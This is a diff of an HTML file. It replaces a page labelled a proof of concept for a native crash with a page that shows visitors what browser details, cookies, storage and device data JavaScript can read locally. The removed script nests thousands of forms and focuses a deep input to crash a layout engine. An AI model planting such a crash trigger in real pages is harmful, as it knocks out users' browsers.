@@ -1,33 +1,241 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>libhelium Native SIGSEGV PoC</title>
+<meta charset="UTF-8">
+<title>What This Page Can See About You</title>
+<style>
+  :root{
+    --bg:#0f1115; --panel:#171a21; --border:#262b36;
+    --text:#e6e9ef; --muted:#8b93a7; --accent:#6ee7b7; --warn:#f5a623;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:var(--bg); color:var(--text); padding:24px;
+  }
+  h1{font-size:1.4rem; margin-bottom:4px;}
+  p.sub{color:var(--muted); margin-top:0; font-size:0.9rem;}
+  .grid{display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:16px; margin-top:20px;}
+  .card{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:16px;}
+  .card h2{font-size:0.95rem; margin:0 0 10px; color:var(--accent);}
+  table{width:100%; border-collapse:collapse; font-size:0.85rem;}
+  td{padding:4px 0; vertical-align:top; border-bottom:1px solid var(--border);}
+  td.key{color:var(--muted); width:42%; padding-right:8px;}
+  td.val{word-break:break-word;}
+  button{
+    background:var(--accent); color:#0f1115; border:none; padding:8px 14px;
+    border-radius:6px; font-weight:600; cursor:pointer; font-size:0.85rem;
+  }
+  button:hover{opacity:0.9;}
+  .note{background:#241c0f; border:1px solid #4a3a12; color:var(--warn);
+    padding:10px 14px; border-radius:8px; font-size:0.85rem; margin-top:20px;}
+  pre{white-space:pre-wrap; word-break:break-word; font-size:0.8rem; margin:0;}
+</style>
 </head>
-    <body>
-    <div id="root"></div>
-    <script>
-    function triggerMemoryCorruption() {
-        let current = document.getElementById('root');
-        
-        // Generate deep tree to force unbounded native C++ allocation
-        for (let i = 0; i < 5000; i++) {
-            let f = document.createElement('form');
-            let input1 = document.createElement('input');
-            input1.type = "text";
-            let input2 = document.createElement('input');
-            input2.type = "password";
-            f.appendChild(input1);
-            f.appendChild(input2);
-            current.appendChild(f);
-            current = f;
-        }
-        
-        // Trigger unbounded recursive tree walk in native layout engine
-        let deepInput = current.querySelector('input');
-        if(deepInput) deepInput.focus();
+<body>
+
+<h1>What This Page Can See About You</h1>
+<p class="sub">Everything below is read directly by JavaScript running in your own browser and displayed only to you here — nothing is uploaded anywhere unless labeled otherwise (IP lookup uses a public third-party API).</p>
+
+<div class="grid" id="grid"></div>
+
+<div class="note" id="permNote">
+  Some browsers/APIs (geolocation, battery, clipboard) require your explicit permission or aren't supported everywhere — those sections will show "not available" if blocked or unsupported.
+</div>
+
+<script>
+function section(title){
+  const card = document.createElement('div');
+  card.className = 'card';
+  const h2 = document.createElement('h2');
+  h2.textContent = title;
+  const table = document.createElement('table');
+  card.appendChild(h2);
+  card.appendChild(table);
+  document.getElementById('grid').appendChild(card);
+  return table;
+}
+function row(table, key, val){
+  const tr = document.createElement('tr');
+  const k = document.createElement('td'); k.className='key'; k.textContent = key;
+  const v = document.createElement('td'); v.className='val';
+  v.textContent = (val === undefined || val === null || val === '') ? '(none)' : val;
+  tr.appendChild(k); tr.appendChild(v);
+  table.appendChild(tr);
+}
+
+// ---- Navigator / Browser ----
+(function(){
+  const t = section('Browser & Navigator');
+  row(t,'User Agent', navigator.userAgent);
+  row(t,'App Version', navigator.appVersion);
+  row(t,'Platform', navigator.platform);
+  row(t,'Vendor', navigator.vendor);
+  row(t,'Language', navigator.language);
+  row(t,'Languages', (navigator.languages||[]).join(', '));
+  row(t,'Cookies Enabled', navigator.cookieEnabled);
+  row(t,'Do Not Track', navigator.doNotTrack);
+  row(t,'Hardware Concurrency (CPU cores)', navigator.hardwareConcurrency);
+  row(t,'Device Memory (GB, if exposed)', navigator.deviceMemory);
+  row(t,'Max Touch Points', navigator.maxTouchPoints);
+  row(t,'PDF Viewer Enabled', navigator.pdfViewerEnabled);
+  row(t,'Webdriver (automation flag)', navigator.webdriver);
+  row(t,'Online', navigator.onLine);
+})();
+
+// ---- Screen / Display ----
+(function(){
+  const t = section('Screen & Display');
+  row(t,'Screen Width x Height', screen.width+' x '+screen.height);
+  row(t,'Available Width x Height', screen.availWidth+' x '+screen.availHeight);
+  row(t,'Color Depth', screen.colorDepth);
+  row(t,'Pixel Depth', screen.pixelDepth);
+  row(t,'Device Pixel Ratio', window.devicePixelRatio);
+  row(t,'Orientation', screen.orientation ? screen.orientation.type : 'n/a');
+  row(t,'Inner Window Size', window.innerWidth+' x '+window.innerHeight);
+  row(t,'Outer Window Size', window.outerWidth+' x '+window.outerHeight);
+})();
+
+// ---- Locale / Time ----
+(function(){
+  const t = section('Locale & Time');
+  const dtf = Intl.DateTimeFormat().resolvedOptions();
+  row(t,'Timezone', dtf.timeZone);
+  row(t,'Locale', dtf.locale);
+  row(t,'Current Local Time', new Date().toString());
+  row(t,'UTC Offset (minutes)', new Date().getTimezoneOffset());
+})();
+
+// ---- Page / Referrer ----
+(function(){
+  const t = section('Page Context');
+  row(t,'Current URL', location.href);
+  row(t,'Referrer', document.referrer);
+  row(t,'Page Title', document.title);
+  row(t,'History Length', history.length);
+})();
+
+// ---- Cookies ----
+(function(){
+  const t = section('Cookies (document.cookie)');
+  if(document.cookie){
+    document.cookie.split(';').forEach(c=>{
+      const [k,...rest] = c.trim().split('=');
+      row(t,k, rest.join('='));
+    });
+  } else {
+    row(t,'Cookies found','(none — this page hasn\'t set any, and can only see cookies belonging to its own origin)');
+  }
+})();
+
+// ---- Storage ----
+(function(){
+  const t = section('LocalStorage');
+  if(localStorage.length===0) row(t,'Entries','(empty)');
+  for(let i=0;i<localStorage.length;i++){
+    const k = localStorage.key(i);
+    row(t,k, localStorage.getItem(k));
+  }
+})();
+(function(){
+  const t = section('SessionStorage');
+  if(sessionStorage.length===0) row(t,'Entries','(empty)');
+  for(let i=0;i<sessionStorage.length;i++){
+    const k = sessionStorage.key(i);
+    row(t,k, sessionStorage.getItem(k));
+  }
+})();
+
+// ---- Connection ----
+(function(){
+  const t = section('Network Info');
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(c){
+    row(t,'Effective Type', c.effectiveType);
+    row(t,'Downlink (Mbps est.)', c.downlink);
+    row(t,'RTT (ms est.)', c.rtt);
+    row(t,'Save Data Mode', c.saveData);
+  } else {
+    row(t,'Connection API','not available in this browser');
+  }
+})();
+
+// ---- Public IP (third-party lookup, clearly labeled) ----
+(function(){
+  const t = section('Public IP (via third-party API: ipify.org)');
+  row(t,'Status','loading…');
+  fetch('https://api.ipify.org?format=json')
+    .then(r=>r.json())
+    .then(d=>{ t.innerHTML=''; row(t,'IP Address', d.ip); })
+    .catch(()=>{ t.innerHTML=''; row(t,'IP Address','lookup failed / blocked'); });
+})();
+
+// ---- Battery (permission-gated / may be unsupported) ----
+(function(){
+  const t = section('Battery Status');
+  if(navigator.getBattery){
+    navigator.getBattery().then(b=>{
+      row(t,'Charging', b.charging);
+      row(t,'Level', Math.round(b.level*100)+'%');
+      row(t,'Charging Time (s)', b.chargingTime);
+      row(t,'Discharging Time (s)', b.dischargingTime);
+    });
+  } else {
+    row(t,'Battery API','not available in this browser');
+  }
+})();
+
+// ---- Geolocation (requires explicit user permission) ----
+(function(){
+  const t = section('Geolocation (needs your permission)');
+  row(t,'Status','click "Request Location" below');
+  const card = t.parentElement;
+  const btn = document.createElement('button');
+  btn.textContent = 'Request Location';
+  btn.onclick = ()=>{
+    if(!navigator.geolocation){ row(t,'Result','Geolocation not supported'); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos=>{
+        t.innerHTML='';
+        row(t,'Latitude', pos.coords.latitude);
+        row(t,'Longitude', pos.coords.longitude);
+        row(t,'Accuracy (m)', pos.coords.accuracy);
+      },
+      err=>{ row(t,'Result','Denied or unavailable: '+err.message); }
+    );
+  };
+  card.appendChild(btn);
+})();
+
+// ---- Media devices (labels require permission; counts don't) ----
+(function(){
+  const t = section('Media Devices');
+  if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
+    navigator.mediaDevices.enumerateDevices().then(devices=>{
+      const counts = {audioinput:0, videoinput:0, audiooutput:0};
+      devices.forEach(d=> counts[d.kind] = (counts[d.kind]||0)+1);
+      row(t,'Microphones (input)', counts.audioinput);
+      row(t,'Cameras (video input)', counts.videoinput);
+      row(t,'Speakers (output)', counts.audiooutput);
+      row(t,'Note','Device labels are hidden until mic/camera permission is granted.');
+    });
+  } else {
+    row(t,'Media Devices API','not available');
+  }
+})();
+
+// ---- Plugins (mostly deprecated but still readable in some browsers) ----
+(function(){
+  const t = section('Plugins');
+  if(navigator.plugins && navigator.plugins.length){
+    for(let i=0;i<navigator.plugins.length;i++){
+      row(t, navigator.plugins[i].name, navigator.plugins[i].description);
     }
-    setTimeout(triggerMemoryCorruption, 500);
-    </script>
-    </body>
+  } else {
+    row(t,'Plugins','(none reported — most modern browsers hide this)');
+  }
+})();
+</script>
+
+</body>
 </html>
